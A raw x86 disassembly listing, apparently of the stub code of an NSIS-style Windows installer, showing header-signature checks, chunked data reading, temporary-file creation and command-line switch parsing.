  4032a3:	55                   	push   %ebp
  4032a4:	8b ec                	mov    %esp,%ebp
  4032a6:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  4032ac:	53                   	push   %ebx
  4032ad:	56                   	push   %esi
  4032ae:	33 db                	xor    %ebx,%ebx
  4032b0:	57                   	push   %edi
  4032b1:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  4032b4:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4032b7:	ff 15 90 80 40 00    	call   *0x408090
  4032bd:	68 04 20 00 00       	push   $0x2004
  4032c2:	be d8 10 4e 00       	mov    $0x4e10d8,%esi
  4032c7:	56                   	push   %esi
  4032c8:	05 e8 03 00 00       	add    $0x3e8,%eax
  4032cd:	53                   	push   %ebx
  4032ce:	a3 20 46 47 00       	mov    %eax,0x474620
  4032d3:	ff 15 9c 80 40 00    	call   *0x40809c
  4032d9:	6a 03                	push   $0x3
  4032db:	68 00 00 00 80       	push   $0x80000000
  4032e0:	56                   	push   %esi
  4032e1:	e8 2f 2b 00 00       	call   0x405e15
  4032e6:	8b f8                	mov    %eax,%edi
  4032e8:	89 3d 10 a0 40 00    	mov    %edi,0x40a010
  4032ee:	83 ff ff             	cmp    $0xffffffff,%edi
  4032f1:	75 0a                	jne    0x4032fd
  4032f3:	b8 68 85 40 00       	mov    $0x408568,%eax
  4032f8:	e9 3a 02 00 00       	jmp    0x403537
  4032fd:	56                   	push   %esi
  4032fe:	be b8 10 4d 00       	mov    $0x4d10b8,%esi
  403303:	56                   	push   %esi
  403304:	e8 c6 2c 00 00       	call   0x405fcf
  403309:	56                   	push   %esi
  40330a:	e8 8c 32 00 00       	call   0x40659b
  40330f:	50                   	push   %eax
  403310:	68 e0 50 4e 00       	push   $0x4e50e0
  403315:	e8 b5 2c 00 00       	call   0x405fcf
  40331a:	53                   	push   %ebx
  40331b:	57                   	push   %edi
  40331c:	ff 15 98 80 40 00    	call   *0x408098
  403322:	3b c3                	cmp    %ebx,%eax
  403324:	a3 e0 e1 42 00       	mov    %eax,0x42e1e0
  403329:	8b f0                	mov    %eax,%esi
  40332b:	0f 8e e7 00 00 00    	jle    0x403418
  403331:	bb 58 e1 41 00       	mov    $0x41e158,%ebx
  403336:	a1 2c 46 47 00       	mov    0x47462c,%eax
  40333b:	f7 d8                	neg    %eax
  40333d:	1b c0                	sbb    %eax,%eax
  40333f:	25 00 7e 00 00       	and    $0x7e00,%eax
  403344:	05 00 02 00 00       	add    $0x200,%eax
  403349:	3b f0                	cmp    %eax,%esi
  40334b:	8b fe                	mov    %esi,%edi
  40334d:	7c 02                	jl     0x403351
  40334f:	8b f8                	mov    %eax,%edi
  403351:	57                   	push   %edi
  403352:	53                   	push   %ebx
  403353:	e8 59 fc ff ff       	call   0x402fb1
  403358:	85 c0                	test   %eax,%eax
  40335a:	0f 84 4b 01 00 00    	je     0x4034ab
  403360:	83 3d 2c 46 47 00 00 	cmpl   $0x0,0x47462c
  403367:	75 7a                	jne    0x4033e3
  403369:	6a 1c                	push   $0x1c
  40336b:	53                   	push   %ebx
  40336c:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40336f:	50                   	push   %eax
  403370:	e8 5c 2a 00 00       	call   0x405dd1
  403375:	8b 45 dc             	mov    -0x24(%ebp),%eax
  403378:	a9 f0 ff ff ff       	test   $0xfffffff0,%eax
  40337d:	75 72                	jne    0x4033f1
  40337f:	81 7d e0 ef be ad de 	cmpl   $0xdeadbeef,-0x20(%ebp)
  403386:	75 69                	jne    0x4033f1
  403388:	81 7d ec 49 6e 73 74 	cmpl   $0x74736e49,-0x14(%ebp)
  40338f:	75 60                	jne    0x4033f1
  403391:	81 7d e8 73 6f 66 74 	cmpl   $0x74666f73,-0x18(%ebp)
  403398:	75 57                	jne    0x4033f1
  40339a:	81 7d e4 4e 75 6c 6c 	cmpl   $0x6c6c754e,-0x1c(%ebp)
  4033a1:	75 4e                	jne    0x4033f1
  4033a3:	09 45 08             	or     %eax,0x8(%ebp)
  4033a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4033a9:	8b 0d 54 e1 41 00    	mov    0x41e154,%ecx
  4033af:	83 e0 02             	and    $0x2,%eax
  4033b2:	09 05 a0 46 47 00    	or     %eax,0x4746a0
  4033b8:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4033bb:	3b c6                	cmp    %esi,%eax
  4033bd:	89 0d 2c 46 47 00    	mov    %ecx,0x47462c
  4033c3:	0f 8f ea 00 00 00    	jg     0x4034b3
  4033c9:	f6 45 08 08          	testb  $0x8,0x8(%ebp)
  4033cd:	75 06                	jne    0x4033d5
  4033cf:	f6 45 08 04          	testb  $0x4,0x8(%ebp)
  4033d3:	75 41                	jne    0x403416
  4033d5:	ff 45 f8             	incl   -0x8(%ebp)
  4033d8:	8d 70 fc             	lea    -0x4(%eax),%esi
  4033db:	3b fe                	cmp    %esi,%edi
  4033dd:	76 12                	jbe    0x4033f1
  4033df:	8b fe                	mov    %esi,%edi
  4033e1:	eb 0e                	jmp    0x4033f1
  4033e3:	f6 45 08 02          	testb  $0x2,0x8(%ebp)
  4033e7:	75 08                	jne    0x4033f1
  4033e9:	6a 00                	push   $0x0
  4033eb:	e8 1f fb ff ff       	call   0x402f0f
  4033f0:	59                   	pop    %ecx
  4033f1:	3b 35 e0 e1 42 00    	cmp    0x42e1e0,%esi
  4033f7:	7d 0d                	jge    0x403406
  4033f9:	57                   	push   %edi
  4033fa:	53                   	push   %ebx
  4033fb:	ff 75 fc             	push   -0x4(%ebp)
  4033fe:	e8 bc 38 00 00       	call   0x406cbf
  403403:	89 45 fc             	mov    %eax,-0x4(%ebp)
  403406:	01 3d 54 e1 41 00    	add    %edi,0x41e154
  40340c:	2b f7                	sub    %edi,%esi
  40340e:	85 f6                	test   %esi,%esi
  403410:	0f 8f 20 ff ff ff    	jg     0x403336
  403416:	33 db                	xor    %ebx,%ebx
  403418:	6a 01                	push   $0x1
  40341a:	e8 f0 fa ff ff       	call   0x402f0f
  40341f:	59                   	pop    %ecx
  403420:	39 1d 2c 46 47 00    	cmp    %ebx,0x47462c
  403426:	0f 84 87 00 00 00    	je     0x4034b3
  40342c:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  40342f:	74 22                	je     0x403453
  403431:	ff 35 54 e1 41 00    	push   0x41e154
  403437:	e8 a7 fb ff ff       	call   0x402fe3
  40343c:	6a 04                	push   $0x4
  40343e:	8d 45 08             	lea    0x8(%ebp),%eax
  403441:	50                   	push   %eax
  403442:	e8 6a fb ff ff       	call   0x402fb1
  403447:	85 c0                	test   %eax,%eax
  403449:	74 68                	je     0x4034b3
  40344b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40344e:	3b 45 08             	cmp    0x8(%ebp),%eax
  403451:	75 60                	jne    0x4034b3
  403453:	ff 75 f0             	push   -0x10(%ebp)
  403456:	6a 40                	push   $0x40
  403458:	ff 15 24 81 40 00    	call   *0x408124
  40345e:	b9 58 61 42 00       	mov    $0x426158,%ecx
  403463:	8b f0                	mov    %eax,%esi
  403465:	e8 c6 38 00 00       	call   0x406d30
  40346a:	68 c8 90 4d 00       	push   $0x4d90c8
  40346f:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  403475:	50                   	push   %eax
  403476:	e8 c9 29 00 00       	call   0x405e44
  40347b:	53                   	push   %ebx
  40347c:	68 00 01 00 04       	push   $0x4000100
  403481:	6a 02                	push   $0x2
  403483:	53                   	push   %ebx
  403484:	53                   	push   %ebx
  403485:	68 00 00 00 c0       	push   $0xc0000000
  40348a:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  403490:	50                   	push   %eax
  403491:	ff 15 94 80 40 00    	call   *0x408094
  403497:	a3 14 a0 40 00       	mov    %eax,0x40a014
  40349c:	83 f8 ff             	cmp    $0xffffffff,%eax
  40349f:	75 19                	jne    0x4034ba
  4034a1:	b8 e0 84 40 00       	mov    $0x4084e0,%eax
  4034a6:	e9 8c 00 00 00       	jmp    0x403537
  4034ab:	6a 01                	push   $0x1
  4034ad:	e8 5d fa ff ff       	call   0x402f0f
  4034b2:	59                   	pop    %ecx
  4034b3:	b8 48 83 40 00       	mov    $0x408348,%eax
  4034b8:	eb 7d                	jmp    0x403537
  4034ba:	a1 2c 46 47 00       	mov    0x47462c,%eax
  4034bf:	83 c0 1c             	add    $0x1c,%eax
  4034c2:	50                   	push   %eax
  4034c3:	e8 1b fb ff ff       	call   0x402fe3
  4034c8:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4034cb:	ff 75 f0             	push   -0x10(%ebp)
  4034ce:	f7 d1                	not    %ecx
  4034d0:	83 e1 04             	and    $0x4,%ecx
  4034d3:	a3 ec 21 43 00       	mov    %eax,0x4321ec
  4034d8:	2b c1                	sub    %ecx,%eax
  4034da:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4034dd:	56                   	push   %esi
  4034de:	53                   	push   %ebx
  4034df:	8d 44 08 e4          	lea    -0x1c(%eax,%ecx,1),%eax
  4034e3:	6a ff                	push   $0xffffffff
  4034e5:	a3 e8 21 43 00       	mov    %eax,0x4321e8
  4034ea:	e8 89 fc ff ff       	call   0x403178
  4034ef:	3b 45 f0             	cmp    -0x10(%ebp),%eax
  4034f2:	75 bf                	jne    0x4034b3
  4034f4:	f6 45 dc 01          	testb  $0x1,-0x24(%ebp)
  4034f8:	89 35 dc 45 47 00    	mov    %esi,0x4745dc
  4034fe:	8b 06                	mov    (%esi),%eax
  403500:	a3 28 46 47 00       	mov    %eax,0x474628
  403505:	74 06                	je     0x40350d
  403507:	ff 05 24 46 47 00    	incl   0x474624
  40350d:	6a 08                	push   $0x8
  40350f:	59                   	pop    %ecx
  403510:	8d 46 44             	lea    0x44(%esi),%eax
  403513:	83 e8 08             	sub    $0x8,%eax
  403516:	01 30                	add    %esi,(%eax)
  403518:	49                   	dec    %ecx
  403519:	3b cb                	cmp    %ebx,%ecx
  40351b:	75 f6                	jne    0x403513
  40351d:	a1 e4 e1 42 00       	mov    0x42e1e4,%eax
  403522:	89 46 3c             	mov    %eax,0x3c(%esi)
  403525:	6a 40                	push   $0x40
  403527:	83 c6 04             	add    $0x4,%esi
  40352a:	56                   	push   %esi
  40352b:	68 e0 45 47 00       	push   $0x4745e0
  403530:	e8 9c 28 00 00       	call   0x405dd1
  403535:	33 c0                	xor    %eax,%eax
  403537:	5f                   	pop    %edi
  403538:	5e                   	pop    %esi
  403539:	5b                   	pop    %ebx
  40353a:	c9                   	leave
  40353b:	c2 04 00             	ret    $0x4
  40353e:	55                   	push   %ebp
  40353f:	8b ec                	mov    %esp,%ebp
  403541:	83 ec 24             	sub    $0x24,%esp
  403544:	a1 0c a2 43 00       	mov    0x43a20c,%eax
  403549:	56                   	push   %esi
  40354a:	33 f6                	xor    %esi,%esi
  40354c:	89 75 fc             	mov    %esi,-0x4(%ebp)
  40354f:	3b c6                	cmp    %esi,%eax
  403551:	75 24                	jne    0x403577
  403553:	68 b0 85 40 00       	push   $0x4085b0
  403558:	68 9c 85 40 00       	push   $0x40859c
  40355d:	ff 15 34 81 40 00    	call   *0x408134
  403563:	50                   	push   %eax
  403564:	ff 15 a0 80 40 00    	call   *0x4080a0
  40356a:	a3 0c a2 43 00       	mov    %eax,0x43a20c
  40356f:	3b c6                	cmp    %esi,%eax
  403571:	75 04                	jne    0x403577
  403573:	33 c0                	xor    %eax,%eax
  403575:	eb 41                	jmp    0x4035b8
  403577:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40357a:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  40357d:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  403580:	f7 d9                	neg    %ecx
  403582:	1b c9                	sbb    %ecx,%ecx
  403584:	83 e1 02             	and    $0x2,%ecx
  403587:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  40358a:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  40358d:	51                   	push   %ecx
  40358e:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  403591:	51                   	push   %ecx
  403592:	ff 75 08             	push   0x8(%ebp)
  403595:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  403598:	51                   	push   %ecx
  403599:	89 75 f8             	mov    %esi,-0x8(%ebp)
  40359c:	c7 45 dc 18 00 00 00 	movl   $0x18,-0x24(%ebp)
  4035a3:	89 75 e0             	mov    %esi,-0x20(%ebp)
  4035a6:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4035a9:	89 75 ec             	mov    %esi,-0x14(%ebp)
  4035ac:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4035af:	ff d0                	call   *%eax
  4035b1:	85 c0                	test   %eax,%eax
  4035b3:	7c be                	jl     0x403573
  4035b5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4035b8:	5e                   	pop    %esi
  4035b9:	c9                   	leave
  4035ba:	c2 0c 00             	ret    $0xc
  4035bd:	55                   	push   %ebp
  4035be:	8b ec                	mov    %esp,%ebp
  4035c0:	83 ec 1c             	sub    $0x1c,%esp
  4035c3:	53                   	push   %ebx
  4035c4:	56                   	push   %esi
  4035c5:	57                   	push   %edi
  4035c6:	33 c0                	xor    %eax,%eax
  4035c8:	33 f6                	xor    %esi,%esi
  4035ca:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4035cd:	8d 7d e8             	lea    -0x18(%ebp),%edi
  4035d0:	ab                   	stos   %eax,%es:(%edi)
  4035d1:	ab                   	stos   %eax,%es:(%edi)
  4035d2:	ab                   	stos   %eax,%es:(%edi)
  4035d3:	ab                   	stos   %eax,%es:(%edi)
  4035d4:	bb 01 00 00 c0       	mov    $0xc0000001,%ebx
  4035d9:	89 75 fc             	mov    %esi,-0x4(%ebp)
  4035dc:	ab                   	stos   %eax,%es:(%edi)
  4035dd:	39 35 08 a2 43 00    	cmp    %esi,0x43a208
  4035e3:	75 20                	jne    0x403605
  4035e5:	68 c0 85 40 00       	push   $0x4085c0
  4035ea:	68 9c 85 40 00       	push   $0x40859c
  4035ef:	ff 15 34 81 40 00    	call   *0x408134
  4035f5:	50                   	push   %eax
  4035f6:	ff 15 a0 80 40 00    	call   *0x4080a0
  4035fc:	a3 08 a2 43 00       	mov    %eax,0x43a208
  403601:	3b c6                	cmp    %esi,%eax
  403603:	74 3f                	je     0x403644
  403605:	ff 75 08             	push   0x8(%ebp)
  403608:	56                   	push   %esi
  403609:	68 10 04 00 00       	push   $0x410
  40360e:	e8 2b ff ff ff       	call   0x40353e
  403613:	8b f8                	mov    %eax,%edi
  403615:	3b fe                	cmp    %esi,%edi
  403617:	74 2b                	je     0x403644
  403619:	8d 45 fc             	lea    -0x4(%ebp),%eax
  40361c:	50                   	push   %eax
  40361d:	6a 18                	push   $0x18
  40361f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  403622:	50                   	push   %eax
  403623:	56                   	push   %esi
  403624:	57                   	push   %edi
  403625:	ff 15 08 a2 43 00    	call   *0x43a208
  40362b:	8b d8                	mov    %eax,%ebx
  40362d:	3b de                	cmp    %esi,%ebx
  40362f:	7c 0c                	jl     0x40363d
  403631:	8b 45 0c             	mov    0xc(%ebp),%eax
  403634:	3b c6                	cmp    %esi,%eax
  403636:	74 05                	je     0x40363d
  403638:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40363b:	89 08                	mov    %ecx,(%eax)
  40363d:	57                   	push   %edi
  40363e:	ff 15 bc 80 40 00    	call   *0x4080bc
  403644:	5f                   	pop    %edi
  403645:	5e                   	pop    %esi
  403646:	8b c3                	mov    %ebx,%eax
  403648:	5b                   	pop    %ebx
  403649:	c9                   	leave
  40364a:	c2 08 00             	ret    $0x8
  40364d:	56                   	push   %esi
  40364e:	be c8 90 4d 00       	mov    $0x4d90c8,%esi
  403653:	56                   	push   %esi
  403654:	e8 14 2a 00 00       	call   0x40606d
  403659:	56                   	push   %esi
  40365a:	e8 2c 26 00 00       	call   0x405c8b
  40365f:	85 c0                	test   %eax,%eax
  403661:	75 02                	jne    0x403665
  403663:	5e                   	pop    %esi
  403664:	c3                   	ret
  403665:	56                   	push   %esi
  403666:	e8 01 2f 00 00       	call   0x40656c
  40366b:	6a 00                	push   $0x0
  40366d:	56                   	push   %esi
  40366e:	ff 15 84 80 40 00    	call   *0x408084
  403674:	56                   	push   %esi
  403675:	68 c0 50 4d 00       	push   $0x4d50c0
  40367a:	e8 c5 27 00 00       	call   0x405e44
  40367f:	5e                   	pop    %esi
  403680:	c3                   	ret
  403681:	55                   	push   %ebp
  403682:	8b ec                	mov    %esp,%ebp
  403684:	56                   	push   %esi
  403685:	8b 75 08             	mov    0x8(%ebp),%esi
  403688:	57                   	push   %edi
  403689:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40368c:	33 c0                	xor    %eax,%eax
  40368e:	0f b7 0e             	movzwl (%esi),%ecx
  403691:	0f b7 17             	movzwl (%edi),%edx
  403694:	46                   	inc    %esi
  403695:	46                   	inc    %esi
  403696:	47                   	inc    %edi
  403697:	47                   	inc    %edi
  403698:	ff 4d 10             	decl   0x10(%ebp)
  40369b:	66 3b ca             	cmp    %dx,%cx
  40369e:	77 18                	ja     0x4036b8
  4036a0:	72 11                	jb     0x4036b3
  4036a2:	66 85 c9             	test   %cx,%cx
  4036a5:	74 14                	je     0x4036bb
  4036a7:	66 85 d2             	test   %dx,%dx
  4036aa:	74 0f                	je     0x4036bb
  4036ac:	39 45 10             	cmp    %eax,0x10(%ebp)
  4036af:	75 dd                	jne    0x40368e
  4036b1:	eb 08                	jmp    0x4036bb
  4036b3:	83 c8 ff             	or     $0xffffffff,%eax
  4036b6:	eb 03                	jmp    0x4036bb
  4036b8:	33 c0                	xor    %eax,%eax
  4036ba:	40                   	inc    %eax
  4036bb:	83 7d 10 00          	cmpl   $0x0,0x10(%ebp)
  4036bf:	5f                   	pop    %edi
  4036c0:	5e                   	pop    %esi
  4036c1:	76 13                	jbe    0x4036d6
  4036c3:	85 c0                	test   %eax,%eax
  4036c5:	75 0f                	jne    0x4036d6
  4036c7:	66 3b ca             	cmp    %dx,%cx
  4036ca:	74 0a                	je     0x4036d6
  4036cc:	66 85 c9             	test   %cx,%cx
  4036cf:	0f 95 c0             	setne  %al
  4036d2:	8d 44 00 ff          	lea    -0x1(%eax,%eax,1),%eax
  4036d6:	5d                   	pop    %ebp
  4036d7:	c3                   	ret
  4036d8:	a1 10 a0 40 00       	mov    0x40a010,%eax
  4036dd:	56                   	push   %esi
  4036de:	8b 35 bc 80 40 00    	mov    0x4080bc,%esi
  4036e4:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036e7:	74 0a                	je     0x4036f3
  4036e9:	50                   	push   %eax
  4036ea:	ff d6                	call   *%esi
  4036ec:	83 0d 10 a0 40 00 ff 	orl    $0xffffffff,0x40a010
  4036f3:	a1 14 a0 40 00       	mov    0x40a014,%eax
  4036f8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4036fb:	74 0a                	je     0x403707
  4036fd:	50                   	push   %eax
  4036fe:	ff d6                	call   *%esi
  403700:	83 0d 14 a0 40 00 ff 	orl    $0xffffffff,0x40a014
  403707:	e8 16 05 00 00       	call   0x403c22
  40370c:	6a 07                	push   $0x7
  40370e:	68 d0 d0 4d 00       	push   $0x4dd0d0
  403713:	e8 c7 33 00 00       	call   0x406adf
  403718:	5e                   	pop    %esi
  403719:	c3                   	ret
  40371a:	81 ec 10 03 00 00    	sub    $0x310,%esp
  403720:	53                   	push   %ebx
  403721:	55                   	push   %ebp
  403722:	56                   	push   %esi
  403723:	57                   	push   %edi
  403724:	6a 20                	push   $0x20
  403726:	33 ed                	xor    %ebp,%ebp
  403728:	5b                   	pop    %ebx
  403729:	89 6c 24 1c          	mov    %ebp,0x1c(%esp)
  40372d:	c7 44 24 18 e0 84 40 	movl   $0x4084e0,0x18(%esp)
  403734:	00 
  403735:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  403739:	ff 15 30 80 40 00    	call   *0x408030
  40373f:	68 01 80 00 00       	push   $0x8001
  403744:	ff 15 c0 80 40 00    	call   *0x4080c0
  40374a:	55                   	push   %ebp
  40374b:	ff 15 b4 82 40 00    	call   *0x4082b4
  403751:	6a 08                	push   $0x8
  403753:	a3 b8 46 47 00       	mov    %eax,0x4746b8
  403758:	e8 e8 29 00 00       	call   0x406145
  40375d:	55                   	push   %ebp
  40375e:	68 b4 02 00 00       	push   $0x2b4
  403763:	a3 d0 45 47 00       	mov    %eax,0x4745d0
  403768:	8d 44 24 74          	lea    0x74(%esp),%eax
  40376c:	50                   	push   %eax
  40376d:	55                   	push   %ebp
  40376e:	68 78 86 40 00       	push   $0x408678
  403773:	ff 15 84 81 40 00    	call   *0x408184
  403779:	68 60 86 40 00       	push   $0x408660
  40377e:	68 c0 c5 46 00       	push   $0x46c5c0
  403783:	e8 47 28 00 00       	call   0x405fcf
  403788:	ff 15 74 81 40 00    	call   *0x408174
  40378e:	50                   	push   %eax
  40378f:	bf a0 50 4c 00       	mov    $0x4c50a0,%edi
  403794:	57                   	push   %edi
  403795:	e8 35 28 00 00       	call   0x405fcf
  40379a:	57                   	push   %edi
  40379b:	e8 45 28 00 00       	call   0x405fe5
  4037a0:	68 18 a0 40 00       	push   $0x40a018
  4037a5:	57                   	push   %edi
  4037a6:	8b f0                	mov    %eax,%esi
  4037a8:	e8 c6 25 00 00       	call   0x405d73
  4037ad:	59                   	pop    %ecx
  4037ae:	59                   	pop    %ecx
  4037af:	3b c5                	cmp    %ebp,%eax
  4037b1:	74 2f                	je     0x4037e2
  4037b3:	8b c8                	mov    %eax,%ecx
  4037b5:	2b cf                	sub    %edi,%ecx
  4037b7:	d1 f9                	sar    $1,%ecx
  4037b9:	83 c1 09             	add    $0x9,%ecx
  4037bc:	83 c6 fe             	add    $0xfffffffe,%esi
  4037bf:	3b ce                	cmp    %esi,%ecx
  4037c1:	7d 1f                	jge    0x4037e2
  4037c3:	83 c0 12             	add    $0x12,%eax
  4037c6:	50                   	push   %eax
  4037c7:	e8 63 27 00 00       	call   0x405f2f
  4037cc:	50                   	push   %eax
  4037cd:	a3 10 a2 43 00       	mov    %eax,0x43a210
  4037d2:	ff 15 98 82 40 00    	call   *0x408298
  4037d8:	85 c0                	test   %eax,%eax
  4037da:	75 06                	jne    0x4037e2
  4037dc:	89 2d 10 a2 43 00    	mov    %ebp,0x43a210
  4037e2:	55                   	push   %ebp
  4037e3:	ff 15 34 81 40 00    	call   *0x408134
  4037e9:	66 83 3d a0 50 4c 00 	cmpw   $0x22,0x4c50a0
  4037f0:	22 
  4037f1:	a3 d8 45 47 00       	mov    %eax,0x4745d8
  4037f6:	8b c7                	mov    %edi,%eax
  4037f8:	75 08                	jne    0x403802
  4037fa:	6a 22                	push   $0x22
  4037fc:	5b                   	pop    %ebx
  4037fd:	b8 a2 50 4c 00       	mov    $0x4c50a2,%eax
  403802:	53                   	push   %ebx
  403803:	50                   	push   %eax
  403804:	e8 63 24 00 00       	call   0x405c6c
  403809:	50                   	push   %eax
  40380a:	ff 15 54 82 40 00    	call   *0x408254
  403810:	8b f0                	mov    %eax,%esi
  403812:	89 74 24 14          	mov    %esi,0x14(%esp)
  403816:	e9 8d 00 00 00       	jmp    0x4038a8
  40381b:	6a 20                	push   $0x20
  40381d:	59                   	pop    %ecx
  40381e:	66 3b c1             	cmp    %cx,%ax
  403821:	75 07                	jne    0x40382a
  403823:	46                   	inc    %esi
  403824:	46                   	inc    %esi
  403825:	66 39 0e             	cmp    %cx,(%esi)
  403828:	74 f9                	je     0x403823
  40382a:	66 83 3e 22          	cmpw   $0x22,(%esi)
  40382e:	8b d9                	mov    %ecx,%ebx
  403830:	75 05                	jne    0x403837
  403832:	46                   	inc    %esi
  403833:	6a 22                	push   $0x22
  403835:	46                   	inc    %esi
  403836:	5b                   	pop    %ebx
  403837:	66 83 3e 2f          	cmpw   $0x2f,(%esi)
  40383b:	75 5a                	jne    0x403897
  40383d:	46                   	inc    %esi
  40383e:	46                   	inc    %esi
  40383f:	66 83 3e 53          	cmpw   $0x53,(%esi)
  403843:	75 13                	jne    0x403858
  403845:	0f b7 46 02          	movzwl 0x2(%esi),%eax
  403849:	66 3b c1             	cmp    %cx,%ax
  40384c:	74 05                	je     0x403853
  40384e:	66 3b c5             	cmp    %bp,%ax
  403851:	75 05                	jne    0x403858
  403853:	83 4c 24 10 02       	orl    $0x2,0x10(%esp)
  403858:	6a 04                	push   $0x4
  40385a:	68 54 86 40 00       	push   $0x408654
  40385f:	56                   	push   %esi
  403860:	e8 1c fe ff ff       	call   0x403681
  403865:	83 c4 0c             	add    $0xc,%esp
  403868:	85 c0                	test   %eax,%eax
  40386a:	75 14                	jne    0x403880
  40386c:	0f b7 46 08          	movzwl 0x8(%esi),%eax
  403870:	66 83 f8 20          	cmp    $0x20,%ax
  403874:	74 05                	je     0x40387b
  403876:	66 3b c5             	cmp    %bp,%ax
  403879:	75 05                	jne    0x403880
  40387b:	83 4c 24 10 04       	orl    $0x4,0x10(%esp)
  403880:	6a 04                	push   $0x4
  403882:	8d 46 fc             	lea    -0x4(%esi),%eax
  403885:	68 48 86 40 00       	push   $0x408648
  40388a:	50                   	push   %eax
  40388b:	e8 f1 fd ff ff       	call   0x403681
  403890:	83 c4 0c             	add    $0xc,%esp
  403893:	85 c0                	test   %eax,%eax
  403895:	74 1f                	je     0x4038b6
  403897:	53                   	push   %ebx
  403898:	56                   	push   %esi
  403899:	e8 ce 23 00 00       	call   0x405c6c
  40389e:	8b f0                	mov    %eax,%esi
  4038a0:	66 83 3e 22          	cmpw   $0x22,(%esi)
  4038a4:	75 02                	jne    0x4038a8
  4038a6:	46                   	inc    %esi
  4038a7:	46                   	inc    %esi
  4038a8:	0f b7 06             	movzwl (%esi),%eax
  4038ab:	66 3b c5             	cmp    %bp,%ax
  4038ae:	0f 85 67 ff ff ff    	jne    0x40381b
  4038b4:	eb 1d                	jmp    0x4038d3
  4038b6:	6a 08                	push   $0x8
  4038b8:	8d 46 fc             	lea    -0x4(%esi),%eax
  4038bb:	55                   	push   %ebp
  4038bc:	50                   	push   %eax
  4038bd:	e8 ee 3e 00 00       	call   0x4077b0
  4038c2:	83 c4 0c             	add    $0xc,%esp
  4038c5:	83 c6 04             	add    $0x4,%esi
  4038c8:	56                   	push   %esi
  4038c9:	68 a8 90 4c 00       	push   $0x4c90a8
  4038ce:	e8 fc 26 00 00       	call   0x405fcf
  4038d3:	bb c8 90 4d 00       	mov    $0x4d90c8,%ebx
  4038d8:	53                   	push   %ebx
  4038d9:	68 04 20 00 00       	push   $0x2004
  4038de:	ff 15 b8 80 40 00    	call   *0x4080b8
  4038e4:	e8 64 fd ff ff       	call   0x40364d
  4038e9:	85 c0                	test   %eax,%eax
  4038eb:	75 24                	jne    0x403911
  4038ed:	68 ff 1f 00 00       	push   $0x1fff
  4038f2:	53                   	push   %ebx
  4038f3:	ff 15 b4 80 40 00    	call   *0x4080b4
  4038f9:	68 3c 86 40 00       	push   $0x40863c
  4038fe:	53                   	push   %ebx
  4038ff:	e8 56 27 00 00       	call   0x40605a
  403904:	e8 44 fd ff ff       	call   0x40364d
  403909:	85 c0                	test   %eax,%eax
  40390b:	0f 84 91 00 00 00    	je     0x4039a2
  403911:	68 c0 50 4d 00       	push   $0x4d50c0
  403916:	ff 15 70 81 40 00    	call   *0x408170
  40391c:	ff 74 24 10          	push   0x10(%esp)
  403920:	e8 7e f9 ff ff       	call   0x4032a3
  403925:	89 44 24 18          	mov    %eax,0x18(%esp)
  403929:	3b c5                	cmp    %ebp,%eax
  40392b:	75 75                	jne    0x4039a2
  40392d:	39 2d 24 46 47 00    	cmp    %ebp,0x474624
  403933:	74 5d                	je     0x403992
  403935:	55                   	push   %ebp
  403936:	57                   	push   %edi
  403937:	e8 30 23 00 00       	call   0x405c6c
  40393c:	8b f0                	mov    %eax,%esi
  40393e:	eb 16                	jmp    0x403956
  403940:	6a 04                	push   $0x4
  403942:	68 30 86 40 00       	push   $0x408630
  403947:	56                   	push   %esi
  403948:	e8 34 fd ff ff       	call   0x403681
  40394d:	83 c4 0c             	add    $0xc,%esp
  403950:	85 c0                	test   %eax,%eax
  403952:	74 06                	je     0x40395a
  403954:	4e                   	dec    %esi
  403955:	4e                   	dec    %esi
  403956:	3b f7                	cmp    %edi,%esi
  403958:	73 e6                	jae    0x403940
  40395a:	c7 44 24 18 68 85 40 	movl   $0x408568,0x18(%esp)
  403961:	00 
  403962:	3b f7                	cmp    %edi,%esi
  403964:	72 67                	jb     0x4039cd
  403966:	33 c0                	xor    %eax,%eax
  403968:	66 89 06             	mov    %ax,(%esi)
  40396b:	83 c6 08             	add    $0x8,%esi
  40396e:	56                   	push   %esi
  40396f:	e8 54 2c 00 00       	call   0x4065c8
  403974:	85 c0                	test   %eax,%eax
  403976:	74 2a                	je     0x4039a2
  403978:	56                   	push   %esi
  403979:	68 a8 90 4c 00       	push   $0x4c90a8
  40397e:	e8 4c 26 00 00       	call   0x405fcf
  403983:	56                   	push   %esi
  403984:	68 b0 d0 4c 00       	push   $0x4cd0b0
  403989:	e8 41 26 00 00       	call   0x405fcf
  40398e:	89 6c 24 18          	mov    %ebp,0x18(%esp)
  403992:	83 0d ac 46 47 00 ff 	orl    $0xffffffff,0x4746ac
  403999:	e8 13 1f 00 00       	call   0x4058b1
  40399e:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  4039a2:	e8 31 fd ff ff       	call   0x4036d8
  4039a7:	ff 15 b8 82 40 00    	call   *0x4082b8
  4039ad:	39 6c 24 18          	cmp    %ebp,0x18(%esp)
  4039b1:	0f 84 b6 01 00 00    	je     0x403b6d
  4039b7:	68 10 00 20 00       	push   $0x200010
  4039bc:	ff 74 24 1c          	push   0x1c(%esp)
